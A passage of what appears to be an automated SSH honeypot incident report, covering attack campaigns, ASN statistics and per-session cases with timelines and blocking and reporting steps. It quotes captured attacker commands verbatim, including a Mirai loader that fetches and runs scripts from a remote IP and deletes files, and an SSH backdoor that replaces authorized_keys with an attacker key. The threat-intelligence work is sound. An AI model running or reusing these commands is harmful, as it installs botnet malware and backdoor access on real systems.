| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 3 | 3 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 26 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 14 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 4 | 1 | `T1105, T1070, T1140, T1059.004` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.50`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.134.85.158`, `103.48.192.48`, `41.242.115.83`, `86.102.111.211`, `34.14.122.221`, `201.17.133.138`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget http://213.232.114.14/nokillbins/handshakebins.sh; busybox wget http://213.232.114.14/nokillbins/handshakebins.sh; curl -o handshakebins.sh http://213.232.114.14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114.14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114.14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *
```
Source IPs: `94.154.43.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **105** |
| Unique ASNs | **44** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 38 | HIGH |
| `AS4766` | Korea Telecom | 12 | HIGH |
| `AS25369` | Hydra Communications Ltd | 3 | HIGH |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | LOW |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (327)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bbb0c3f7813a

| Field | Detail |
|---|---|
| **Source IP** | `176.65.134[.]121` |
| **First Seen** | 2026-09-24 12:58 |
| **Last Seen** | 2026-09-24 12:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, root, admin` |
| **TTPs (MITRE)** | T1078 · T1110.001 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:58:37` | `cowrie.session.connect` |
| `2026-09-24 12:58:38` | `cowrie.login.failed` |
| `2026-09-24 12:58:39` | `cowrie.login.success` |
| `2026-09-24 12:58:39` | `cowrie.session.params` |
| `2026-09-24 12:58:39` | `cowrie.command.input` |
| `2026-09-24 12:58:39` | `cowrie.command.failed` |
| `2026-09-24 12:58:40` | `cowrie.command.input` |
| `2026-09-24 12:58:40` | `cowrie.command.failed` |
| `2026-09-24 12:58:40` | `cowrie.command.input` |
| `2026-09-24 12:58:40` | `cowrie.command.failed` |
| `2026-09-24 12:58:40` | `cowrie.log.closed` |
| `2026-09-24 12:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.134[.]121` to AbuseIPDB if not already reported
- [ ] Block `176.65.134[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e27340b357c9

| Field | Detail |
|---|---|
| **Source IP** | `94.41.141[.]36` |
| **First Seen** | 2026-09-24 13:01 |
| **Last Seen** | 2026-09-24 13:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 13:01:44` | `cowrie.session.connect` |
| `2026-09-24 13:01:44` | `cowrie.client.version` |
| `2026-09-24 13:01:44` | `cowrie.client.kex` |
| `2026-09-24 13:01:45` | `cowrie.login.success` |
| `2026-09-24 13:01:46` | `cowrie.session.params` |
| `2026-09-24 13:01:46` | `cowrie.command.input` |
| `2026-09-24 13:01:46` | `cowrie.command.failed` |
| `2026-09-24 13:01:46` | `cowrie.log.closed` |
| `2026-09-24 13:01:47` | `cowrie.session.params` |
| `2026-09-24 13:01:47` | `cowrie.command.input` |
| `2026-09-24 13:01:47` | `cowrie.session.file_download` |
| `2026-09-24 13:01:47` | `cowrie.log.closed` |
| `2026-09-24 13:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.41.141[.]36` to AbuseIPDB if not already reported
- [ ] Block `94.41.141[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b11273906cd8

| Field | Detail |
|---|---|
| **Source IP** | `94.41.141[.]36` |
| **First Seen** | 2026-09-24 13:01 |
| **Last Seen** | 2026-09-24 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 13:01:47` | `cowrie.session.connect` |
| `2026-09-24 13:01:47` | `cowrie.client.version` |
| `2026-09-24 13:01:47` | `cowrie.client.kex` |
| `2026-09-24 13:01:48` | `cowrie.login.success` |
| `2026-09-24 13:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.41.141[.]36` to AbuseIPDB if not already reported
- [ ] Block `94.41.141[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-281ebc4cdd86

| Field | Detail |
|---|---|
| **Source IP** | `94.41.141[.]36` |
| **First Seen** | 2026-09-24 13:01 |
| **Last Seen** | 2026-09-24 13:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 13:01:48` | `cowrie.session.connect` |
| `2026-09-24 13:01:48` | `cowrie.client.version` |
| `2026-09-24 13:01:48` | `cowrie.client.kex` |
| `2026-09-24 13:01:49` | `cowrie.login.success` |
| `2026-09-24 13:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.41.141[.]36` to AbuseIPDB if not already reported
- [ ] Block `94.41.141[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc9be4d7ed8

| Field | Detail |
|---|---|
| **Source IP** | `86.102.111[.]211` |
| **First Seen** | 2026-09-24 13:41 |
| **Last Seen** | 2026-09-24 13:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 13:41:41` | `cowrie.session.connect` |
| `2026-09-24 13:41:41` | `cowrie.client.version` |
| `2026-09-24 13:41:41` | `cowrie.client.kex` |
| `2026-09-24 13:41:42` | `cowrie.login.success` |
| `2026-09-24 13:41:43` | `cowrie.session.params` |
| `2026-09-24 13:41:43` | `cowrie.command.input` |
| `2026-09-24 13:41:43` | `cowrie.command.failed` |
| `2026-09-24 13:41:43` | `cowrie.log.closed` |
| `2026-09-24 13:41:44` | `cowrie.session.params` |
| `2026-09-24 13:41:44` | `cowrie.command.input` |
| `2026-09-24 13:41:44` | `cowrie.session.file_download` |
| `2026-09-24 13:41:44` | `cowrie.log.closed` |
| `2026-09-24 13:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.102.111[.]211` to AbuseIPDB if not already reported
- [ ] Block `86.102.111[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eb6a25f2bf6

| Field | Detail |
|---|---|
| **Source IP** | `86.102.111[.]211` |
| **First Seen** | 2026-09-24 13:41 |
| **Last Seen** | 2026-09-24 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 13:41:45` | `cowrie.session.connect` |
| `2026-09-24 13:41:45` | `cowrie.client.version` |
| `2026-09-24 13:41:45` | `cowrie.client.kex` |
| `2026-09-24 13:41:46` | `cowrie.login.success` |
| `2026-09-24 13:41:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.102.111[.]211` to AbuseIPDB if not already reported
- [ ] Block `86.102.111[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7823e4b31063

| Field | Detail |
|---|---|
| **Source IP** | `86.102.111[.]211` |
| **First Seen** | 2026-09-24 13:41 |
| **Last Seen** | 2026-09-24 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 13:41:46` | `cowrie.session.connect` |
| `2026-09-24 13:41:46` | `cowrie.client.version` |
| `2026-09-24 13:41:46` | `cowrie.client.kex` |
| `2026-09-24 13:41:47` | `cowrie.login.success` |
| `2026-09-24 13:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.102.111[.]211` to AbuseIPDB if not already reported
- [ ] Block `86.102.111[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab227cda3cb8

| Field | Detail |
|---|---|
| **Source IP** | `64.62.156[.]38` |
| **First Seen** | 2026-09-24 13:54 |
| **Last Seen** | 2026-09-24 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 13:54:10` | `cowrie.session.connect` |
| `2026-09-24 13:54:10` | `cowrie.login.success` |
| `2026-09-24 13:54:11` | `cowrie.session.params` |
| `2026-09-24 13:54:11` | `cowrie.command.input` |
| `2026-09-24 13:54:11` | `cowrie.command.input` |
| `2026-09-24 13:54:11` | `cowrie.command.failed` |
| `2026-09-24 13:54:11` | `cowrie.command.input` |
| `2026-09-24 13:54:11` | `cowrie.command.failed` |
| `2026-09-24 13:54:11` | `cowrie.command.input` |
| `2026-09-24 13:54:11` | `cowrie.log.closed` |
| `2026-09-24 13:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.62.156[.]38` to AbuseIPDB if not already reported
- [ ] Block `64.62.156[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e0266907e9b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-24 14:30 |
| **Last Seen** | 2026-09-24 14:30 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 14:30:04` | `cowrie.session.connect` |
| `2026-09-24 14:30:04` | `cowrie.login.success` |
| `2026-09-24 14:30:04` | `cowrie.session.params` |
| `2026-09-24 14:30:06` | `cowrie.command.input` |
| `2026-09-24 14:30:06` | `cowrie.command.input` |
| `2026-09-24 14:30:06` | `cowrie.session.file_download` |
| `2026-09-24 14:30:07` | `cowrie.session.file_download` |
| `2026-09-24 14:30:07` | `cowrie.session.file_download` |
| `2026-09-24 14:30:07` | `cowrie.session.file_download` |
| `2026-09-24 14:30:07` | `cowrie.session.file_download.failed` |
| `2026-09-24 14:30:08` | `cowrie.session.file_download` |
| `2026-09-24 14:30:09` | `cowrie.session.file_download` |
| `2026-09-24 14:30:21` | `cowrie.log.closed` |
| `2026-09-24 14:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-7767ce4e9921

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-24 14:38 |
| **Last Seen** | 2026-09-24 14:38 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 14:38:35` | `cowrie.session.connect` |
| `2026-09-24 14:38:35` | `cowrie.login.success` |
| `2026-09-24 14:38:36` | `cowrie.session.params` |
| `2026-09-24 14:38:37` | `cowrie.command.input` |
| `2026-09-24 14:38:37` | `cowrie.command.input` |
| `2026-09-24 14:38:38` | `cowrie.session.file_download` |
| `2026-09-24 14:38:38` | `cowrie.session.file_download` |
| `2026-09-24 14:38:38` | `cowrie.session.file_download` |
| `2026-09-24 14:38:38` | `cowrie.session.file_download` |
| `2026-09-24 14:38:38` | `cowrie.session.file_download.failed` |
| `2026-09-24 14:38:39` | `cowrie.session.file_download` |
| `2026-09-24 14:38:39` | `cowrie.session.file_download` |
| `2026-09-24 14:38:52` | `cowrie.log.closed` |
| `2026-09-24 14:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22997bf67418

| Field | Detail |
|---|---|
| **Source IP** | `103.72.98[.]15` |
| **First Seen** | 2026-09-24 14:45 |
| **Last Seen** | 2026-09-24 14:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 14:45:04` | `cowrie.session.connect` |
| `2026-09-24 14:45:04` | `cowrie.client.version` |
| `2026-09-24 14:45:04` | `cowrie.client.kex` |
| `2026-09-24 14:45:06` | `cowrie.login.success` |
| `2026-09-24 14:45:07` | `cowrie.session.params` |
| `2026-09-24 14:45:07` | `cowrie.command.input` |
| `2026-09-24 14:45:07` | `cowrie.command.failed` |
| `2026-09-24 14:45:08` | `cowrie.log.closed` |
| `2026-09-24 14:45:09` | `cowrie.session.params` |
| `2026-09-24 14:45:09` | `cowrie.command.input` |
| `2026-09-24 14:45:09` | `cowrie.session.file_download` |
| `2026-09-24 14:45:09` | `cowrie.log.closed` |
| `2026-09-24 14:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.72.98[.]15` to AbuseIPDB if not already reported
- [ ] Block `103.72.98[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c25fba19ffbc

| Field | Detail |
|---|---|
| **Source IP** | `103.72.98[.]15` |
| **First Seen** | 2026-09-24 14:45 |
| **Last Seen** | 2026-09-24 14:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 14:45:09` | `cowrie.session.connect` |
| `2026-09-24 14:45:09` | `cowrie.client.version` |
| `2026-09-24 14:45:09` | `cowrie.client.kex` |
| `2026-09-24 14:45:13` | `cowrie.login.success` |
| `2026-09-24 14:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.72.98[.]15` to AbuseIPDB if not already reported
- [ ] Block `103.72.98[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36171f6b6f04

| Field | Detail |
|---|---|
| **Source IP** | `103.72.98[.]15` |
| **First Seen** | 2026-09-24 14:45 |
| **Last Seen** | 2026-09-24 14:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 14:45:13` | `cowrie.session.connect` |
| `2026-09-24 14:45:13` | `cowrie.client.version` |
| `2026-09-24 14:45:14` | `cowrie.client.kex` |
| `2026-09-24 14:45:16` | `cowrie.login.success` |
| `2026-09-24 14:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.72.98[.]15` to AbuseIPDB if not already reported
- [ ] Block `103.72.98[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75e993d6ec35

| Field | Detail |
|---|---|
| **Source IP** | `39.107.142[.]38` |
| **First Seen** | 2026-09-24 14:57 |
| **Last Seen** | 2026-09-24 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 14:57:05` | `cowrie.session.connect` |
| `2026-09-24 14:57:05` | `cowrie.client.version` |
| `2026-09-24 14:57:05` | `cowrie.client.kex` |
| `2026-09-24 14:57:06` | `cowrie.login.success` |
| `2026-09-24 14:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.107.142[.]38` to AbuseIPDB if not already reported
- [ ] Block `39.107.142[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03fdf273c3c

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 15:24 |
| **Last Seen** | 2026-09-24 15:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 15:24:24` | `cowrie.session.connect` |
| `2026-09-24 15:24:24` | `cowrie.client.version` |
| `2026-09-24 15:24:24` | `cowrie.client.kex` |
| `2026-09-24 15:24:24` | `cowrie.login.success` |
| `2026-09-24 15:24:25` | `cowrie.direct-tcpip.request` |
| `2026-09-24 15:24:25` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 15:24:25` | `cowrie.direct-tcpip.data` |
| `2026-09-24 15:24:25` | `cowrie.direct-tcpip.request` |
| `2026-09-24 15:24:26` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 15:24:26` | `cowrie.direct-tcpip.data` |
| `2026-09-24 15:24:26` | `cowrie.direct-tcpip.request` |
| `2026-09-24 15:24:26` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 15:24:26` | `cowrie.direct-tcpip.data` |
| `2026-09-24 15:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db5e68d6ef3

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 15:27 |
| **Last Seen** | 2026-09-24 15:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 15:27:15` | `cowrie.session.connect` |
| `2026-09-24 15:27:15` | `cowrie.client.version` |
| `2026-09-24 15:27:15` | `cowrie.client.kex` |
| `2026-09-24 15:27:16` | `cowrie.login.success` |
| `2026-09-24 15:27:16` | `cowrie.direct-tcpip.request` |
| `2026-09-24 15:27:16` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 15:27:16` | `cowrie.direct-tcpip.data` |
| `2026-09-24 15:27:17` | `cowrie.direct-tcpip.request` |
| `2026-09-24 15:27:17` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 15:27:17` | `cowrie.direct-tcpip.data` |
